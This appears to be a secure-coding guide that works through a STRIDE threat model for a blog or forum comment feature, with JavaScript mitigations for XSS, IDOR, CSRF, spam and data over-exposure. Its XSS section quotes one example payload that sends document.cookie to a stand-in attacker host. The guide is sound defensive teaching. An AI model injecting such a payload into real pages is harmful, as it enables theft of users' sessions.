# "Leave a Comment" Feature Threat Model

This document outlines the **STRIDE** threat model for a standard "Leave a Comment" feature (often found on blogs, products, or forums), detailing potential risks and practical mitigations.

## Table of Contents
- [1. STRIDE Threat Analysis Overview](#1-stride-threat-analysis-overview)
- [2. In-Depth Mitigations by Threat Category](#2-in-depth-mitigations-by-threat-category)
  - [2.1 Tampering: Cross-Site Scripting (XSS) & Data Sanitization](#21-tampering-cross-site-scripting-xss--data-sanitization)
  - [2.2 Elevation of Privilege: Preventing IDOR](#22-elevation-of-privilege-preventing-idor)
  - [2.3 Spoofing: CSRF and Session Trust](#23-spoofing-csrf-and-session-trust)
  - [2.4 Denial of Service: Spam and Pagination](#24-denial-of-service-spam-and-pagination)
  - [2.5 Information Disclosure: API Over-sharing](#25-information-disclosure-api-over-sharing)
  - [2.6 Repudiation: Accountability and Soft-Deletes](#26-repudiation-accountability-and-soft-deletes)

---

## 1. STRIDE Threat Analysis Overview

| STRIDE Category | Threat Description | Potential Mitigation |
| :--- | :--- | :--- |
| **Spoofing** (Impersonating another user) | An attacker submits a comment claiming to be another user, or forces a victim's browser to submit a comment (CSRF). | Rely strictly on the secure server-side session token to identify the author. Implement Anti-CSRF tokens for all comment submissions. |
| **Tampering** (Modifying data) | **Stored XSS:** An attacker injects malicious JavaScript or HTML into the comment, which executes when other users view it. | Validate input strictly. Use robust server-side sanitization libraries and **always encode output** before rendering. Implement a strong Content Security Policy (CSP). |
| **Repudiation** (Claiming you didn't do something) | An author posts an abusive or illegal comment, deletes it to hide evidence, and claims they never wrote it. | Implement soft-deletes (mark as deleted instead of erasing from DB) and maintain an immutable audit log of comment creation and edits. |
| **Information Disclosure** (Exposing private data) | The API endpoint returning the comments unintentionally includes sensitive data about the authors (e.g., email addresses, internal DB IDs, IP addresses). | Implement strict Data Transfer Objects (DTOs) or serializers that only expose safe, public fields (e.g., `username`, `avatar_url`). |
| **Denial of Service** (Making the system unavailable) | An attacker automates thousands of massive comment submissions, overwhelming the database or causing massive, laggy page loads for readers. | Implement strict rate limiting. Enforce a maximum character limit at the database level. Paginate comment threads on the read-side. |
| **Elevation of Privilege** (Doing things you shouldn't) | An attacker modifies the `comment_id` in an edit/delete request to alter or remove comments belonging to other users or administrators (IDOR). | Always verify that the currently authenticated user is the legitimate owner of the `comment_id` before allowing any state-changing operations. |

---

## 2. In-Depth Mitigations by Threat Category

### 2.1 Tampering: Cross-Site Scripting (XSS) & Data Sanitization

A comment feature accepts arbitrary text from random users and displays it to other users. This makes it the #1 vector for **Stored XSS (Cross-Site Scripting)**. 

If an attacker leaves a comment like `<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>`, and you print that directly to the page, every user who reads the comment will have their session stolen.

#### Mitigation: Output Encoding & Sanitization
Never trust user input. 
1.  **Output Encoding (The primary defense):** Ensure your frontend framework (React, Vue, Angular) is properly escaping HTML characters (`<` becomes `&lt;`). 
2.  **Sanitization (If allowing Rich Text/Markdown):** If you allow users to bold text or add images, you cannot strictly escape all HTML. You MUST use a robust, battle-tested library like **DOMPurify** on the backend *before* saving, or on the frontend *before* rendering.

```javascript
// BAD: Rendering raw HTML
// <div innerHTML={comment.body}></div>

// GOOD: Using a sanitization library for Rich Text
const DOMPurify = require('dompurify');

function saveComment(req, res) {
    const rawComment = req.body.text;
    
    // Clean out dangerous tags like <script>, <iframe>, `onload=` handlers
    const safeComment = DOMPurify.sanitize(rawComment); 
    
    database.save(safeComment);
}
```

---

### 2.2 Elevation of Privilege: Preventing IDOR

**Insecure Direct Object Reference (IDOR)** occurs when an application provides direct access to objects based on user-supplied input without properly validating authorization.

**The Threat:** An attacker realizes that editing their own comment sends a `PUT /api/comments/105` request. They change the ID to `104` (a comment written by an Admin) and change the text to "This product is a scam."

#### Mitigation: Strict Ownership Validation
Whenever a user attempts to edit or delete a comment, you must verify that the `userId` associated with the active session matches the `author_id` of the comment in the database.

```javascript
// Server-Side Verification
async function editComment(req, res) {
  const commentIdToEdit = req.params.id;
  const newText = req.body.text;
  const currentUserId = req.session.userId; // Trust the session, not the client!

  const comment = await database.getComment(commentIdToEdit);

  // 1. Verify existence
  if (!comment) return res.status(404).send("Not found");

  // 2. VERIFY OWNERSHIP (The core mitigation)
  if (comment.author_id !== currentUserId) {
      return res.status(403).send("You do not have permission to edit this comment.");
  }

  // 3. Apply changes
  await database.updateComment(commentIdToEdit, newText);
}
```

---

### 2.3 Spoofing: CSRF and Session Trust

**The Threat:** An attacker embeds a hidden form or script on their malicious website. When a victim (who happens to be logged into your app) visits the attacker's site, the hidden script forces the victim's browser to submit a "Leave a comment" POST request to your site. Because the browser automatically attaches the victim's session cookies, the comment is posted under the victim's name.

#### Mitigation: Anti-CSRF Tokens & SameSite Cookies
1.  **Anti-CSRF Tokens:** Require a hidden, unique, unpredictable token to be submitted alongside the comment. The server verifies this token matches the one tied to the user's session.
2.  **SameSite Cookies:** Set your session cookies with `SameSite=Lax` or `SameSite=Strict`. This instructs the browser *not* to send the session cookie if the POST request originated from a different domain.

**Additionally: Never trust client-supplied IDs.**
Ensure your API never accepts `{"author_id": 5, "text": "Great post!"}`. The `author_id` must exclusively be derived from the validated session token.

---

### 2.4 Denial of Service: Spam and Pagination

Comments are prime targets for automated spam bots and trolls trying to overwhelm your system.

#### Mitigation: Limits and Throttling

1.  **Rate Limiting:** Restrict users to posting a maximum of `X` comments per minute.
2.  **Payload Size Limits:** Do not allow infinite text. Enforce a strict `MAX_LENGTH` at the database schema level (e.g., `VARCHAR(2000)` ) and validate it in your API layer before processing to save memory.
3.  **Mandatory Pagination:** An attacker might post 50,000 comments. If you execute `SELECT * FROM comments WHERE post_id = 1`, your database could crash or the page payload could be 50MB. Always use pagination or infinite scrolling (`LIMIT 50 OFFSET 0`).
4.  **CAPTCHA/Anti-Bot:** For anonymous comments, or even authenticated users exhibiting spam-like behavior, require a CAPTCHA.

---

### 2.5 Information Disclosure: API Over-sharing

**The Threat:** Modern single-page applications (React, Angular) often fetch data as JSON and render it client-side. A lazy backend implementation might just do `SELECT * FROM users INNER JOIN comments` and return the raw objects.

The frontend might only beautifully render the `username` and `comment_text`, but an attacker opening the browser's Network Tab will see the raw JSON response containing the author's `email`, `password_hash`, `stripe_customer_id`, and `last_login_ip`.

#### Mitigation: Explicit DTOs (Data Transfer Objects)
Never serialize your raw database models straight to JSON. Create explicit mappings that whitelist exactly which fields are allowed to be sent to the public client.

```javascript
// BAD: Returning the raw database model
res.json(comment.author); 

// GOOD: Explicitly defining the public DTO
const publicAuthorData = {
    id: comment.author.uuid, // Expose a UUID, not a sequential internal DB ID
    displayName: comment.author.username,
    avatar: comment.author.avatarUrl
};
res.json(publicAuthorData);
```

---

### 2.6 Repudiation: Accountability and Soft-Deletes

**The Threat:** A user posts something highly damaging, illegal, or abusive, causing immediate harm. When confronted, they immediately hit the "Delete" button on their comment. If you run a `DELETE FROM comments` query, the evidence is gone forever, and they can plausibly deny it.

#### Mitigation: Soft Deletes and Audit Logs
If a feature involves user-generated content that could violate Terms of Service, do not hard-delete data.

1.  **Soft Deletes:** Add an `is_deleted` boolean or a `deleted_at` timestamp to your schema. When a user clicks delete, just flip this flag. The application hides the comment, but administrators can still retrieve the evidence if necessary.
2.  **Revision History:** If users can edit comments, consider storing a `comment_revisions` table that tracks every alteration.
